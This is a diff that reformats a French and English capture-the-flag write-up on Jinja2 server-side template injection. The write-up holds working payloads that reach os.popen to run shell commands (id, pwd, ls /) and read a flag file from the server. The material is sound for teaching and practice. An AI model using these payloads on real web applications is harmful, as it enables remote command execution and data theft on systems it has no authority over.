@@ -13,26 +13,24 @@ tags: [MidnightFlag Backslash, write-up]
 
 ## Vérification de la faille :
 Vérification de la SSTI ; si le code est exécuté, le site affichera 49 :
-```php
+```
 {{7*7}}
 ```
 Le code s'étant bien exécuté, on peut poursuivre.
 
 ## Exploitation de la faille
 En recherchant des *payloads* pour exploiter ce type de faille, on en trouve un parfait pour ce que l'on veut faire :
-```php
-{{
-self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+```
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
 ```
 
 On situe notre emplacement sur le serveur avec :
-```php
-{{
-self._TemplateReference__context.cycler.__init__.__globals__.os.popen('pwd').read() }}
+```
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('pwd').read() }}
 ```
 
 On effectue un `ls` sur la racine pour trouver quelque chose d'intéressant :
-```php
+```
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() }}
 ```
 Découverte du dossier `/lakeviewhotel_secrets`.
@@ -41,9 +39,8 @@ Découverte du dossier `/lakeviewhotel_secrets`.
 découverte du fichier `flag.txt`.
 
 Lecture du fichier `flag.txt` :
-```php
-{{
-get_flashed_messages.__globals__.__builtins__.open("/lakeviewhotel_secrets/flag.txt").read() }}
+```
+{{ get_flashed_messages.__globals__.__builtins__.open("/lakeviewhotel_secrets/flag.txt").read() }}
 ```
 
 ____________________________________________________________________________________________________________________________
@@ -52,26 +49,24 @@ ________________________________________________________________________________
 
 ## Vulnerability Verification:
 Verification of SSTI; if the code executes, the site will display 49:
-```php
+```
 {{7*7}}
 ```
 As the code has executed correctly, we can proceed.
 
 ## Exploit of the Vulnerability
 While searching for payloads to exploit this type of vulnerability, we find one perfect for our needs:
-```php
-{{
-self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+```
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
 ```
 
 We locate our position on the server with:
-```php
-{{
-self._TemplateReference__context.cycler.__init__.__globals__.os.popen('pwd').read() }}
+```
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('pwd').read() }}
 ```
 
 We run `ls` on the root directory to find something interesting:
-```php
+```
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() }}
 ```
 Discovery of the folder `lakeviewhotel_secrets`.
@@ -80,7 +75,6 @@ Discovery of the folder `lakeviewhotel_secrets`.
 discovery of the file `flag.txt`.
 
 Reading the file `flag.txt`:
-```php
-{{
-get_flashed_messages.__globals__.__builtins__.open("/lakeviewhotel_secrets/flag.txt").read() }}
+```
+{{ get_flashed_messages.__globals__.__builtins__.open("/lakeviewhotel_secrets/flag.txt").read() }}
 ```
